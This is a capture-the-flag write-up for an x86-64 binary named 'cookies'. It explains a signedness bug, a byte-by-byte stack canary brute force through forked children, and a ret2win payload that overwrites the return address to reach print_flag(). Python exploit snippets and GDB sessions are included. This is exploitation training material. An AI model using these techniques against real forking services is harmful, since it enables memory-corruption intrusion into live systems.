# Cookies — CTF Writeup
### Stack Canary Brute-Force & ret2win

**Binary:** `cookies` · **Arch:** x86-64 ELF · **Host:** `cyber-try.infinitylabs.co.il:1231`  
**Mitigations:** Stack Canary · NX — no PIE · no RELRO

---

## Attack Chain
1. Static analysis — locate the overflow and inventory mitigations
2. Dynamic stack mapping — measure exact offsets with GDB
3. Signedness bug — unlock 65535 input attempts
4. Canary brute-force — byte by byte via fork/waitpid
5. ret2win — overwrite return address with `print_flag()`'s static address

---

## Phase 1 — Static Analysis

### Ghidra — main()

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  ushort local_24;          // cookie count — stored unsigned
  ushort local_22;          // loop counter
  __pid_t local_20;
  uint local_1c;
  undefined1 local_18[8];   // 8-byte input buffer
  long local_10;            // stack canary (fs:0x28)

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  // ... setbuf / dup2 omitted ...

  puts("How many cookies do you want?");
  __isoc99_scanf(&DAT_00402031, &local_24);

  if ((short)local_24 < 0xb) {         // ← signedness bug: ushort cast to short
    for (local_22 = 1; local_22 <= local_24; local_22 = local_22 + 1) {
      local_20 = fork();
      if (local_20 == 0) {             // child process
        puts("Which taste?\n1) Chocolate Chip.\n2) Caramel Pretzel.\n3) Peanut Butter.");
        read(0, local_18, 0x20);       // ← overflow: 32 bytes into 8-byte buffer
        break;
      }
      local_1c = waitpid(local_20, (int *)0x0, 0);
      printf("%d -> Cookie %d is ready!\n", (ulong)(local_22 + 1), (ulong)local_1c);
    }
  }

  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return 0; }
  __stack_chk_fail();                  // ← canary mismatch → process killed
}
```

### checksec

```
$ checksec --file=cookies
```

| Mitigation | Status | Impact |
|---|---|---|
| Stack Canary | **ON** | Must recover before overflowing into return address |
| NX | **ON** | No shellcode; ret2win is unaffected |
| PIE | **OFF** | All addresses static — no ASLR bypass needed |

---

## Phase 2 — Dynamic Stack Mapping (GDB / pwndbg)

```gdb
gdb ./cookies
pwndbg> break *0x4013fa       # hardware BP immediately after read()
pwndbg> run
```

Provide inputs when prompted:

```
How many cookies do you want?
1
Which taste?
1) Chocolate Chip.
2) Caramel Pretzel.
3) Peanut Butter.
AAAAAAAA
```

*Breakpoint fires after `AAAAAAAA` is consumed.*

```gdb
pwndbg> canary
# → TLS Canary: 0x46fb413ce2d27700  at [rbp-0x8]

pwndbg> telescope $rbp-0x10 4
```

```
rbp - 0x10  │ 0x4141414141414141  │  Input buffer (AAAAAAAA)    — offset  0
rbp - 0x08  │ 0x46fb413ce2d27700  │  Stack Canary               — offset  8
rbp + 0x00  │ <saved rbp>         │  Saved RBP                  — offset 16
rbp + 0x08  │ <return address>    │  Saved RIP                  — offset 24
```

---

## Phase 3 — Mitigation Bypass

### Signedness Bug — 65535 Attempts

`local_24` is `ushort`. The guard casts it to `short`: `(short)local_24 < 0xb`.  
Sending `-1` stores `0xFFFF`; `(short)0xFFFF = -1 < 11` → check passes. The loop then runs up to **65535 iterations** — well above the 1,792 guesses needed (256 × 7 bytes).

```c
if ((short)local_24 < 0xb) {           // (short)0xFFFF = -1 → TRUE
    for (local_22 = 1; local_22 <= local_24; ...)  // ushort: up to 65535
```

### Canary Brute-Force via fork() / waitpid()

Each iteration forks a child that inherits the parent's canary. A wrong guess kills only the child — the parent survives with the same canary intact.

> **Key insight:** The canary is stable across all attempts because the parent never crashes.

```python
canary = b"\x00"              # LSB is always 0x00 on Linux x86-64

for i in range(1, 8):
    for guess in range(256):
        candidate = canary + bytes([guess])
        # double-confirm to rule out false positives from partial reads
        if check_canary(p, candidate) and check_canary(p, candidate):
            canary = candidate
            break
```

---

## Phase 4 — Target Identification (ret2win)

PIE is disabled → all addresses are fixed. Ghidra's symbol table reveals:

```
# Ghidra: Functions → search "flag"
0x4012b6  print_flag    # never called in normal flow; static address
```

---

## Phase 5 — Payload Construction

```
[ "A" × 8      ]  — fills the 8-byte input buffer
[ canary        ]  — correct value; stack check passes
[ "B" × 8      ]  — clobbers saved RBP
[ p64(0x4012b6) ]  — overwrites RIP → jumps to print_flag()
```

```python
# canary_exploit.py — send_exploit()
payload = (
    b"A" * BUF_PADDING    # 8 bytes
    + canary              # 8 bytes — correct canary
    + b"B" * RBP_SIZE     # 8 bytes
    + p64(WIN_ADDR)       # 8 bytes — 0x4012b6, little-endian
)
p.send(payload)
# → print_flag() executes → flag printed
```

---

## Script Flow — canary_exploit.py

```
connect()             →  remote(HOST, PORT)
                         sendlineafter("How many cookies?", "-1")   # signedness bug
                         recvuntil(MENU)

brute_force_canary()  →  for each of 7 bytes:
                             for guess in 0..255:
                                 check_canary(p, candidate) × 2
                                 if both pass → byte confirmed

send_exploit()        →  p.send(padding + canary + rbp_pad + p64(WIN_ADDR))
                         recvrepeat(3)   # flag
```
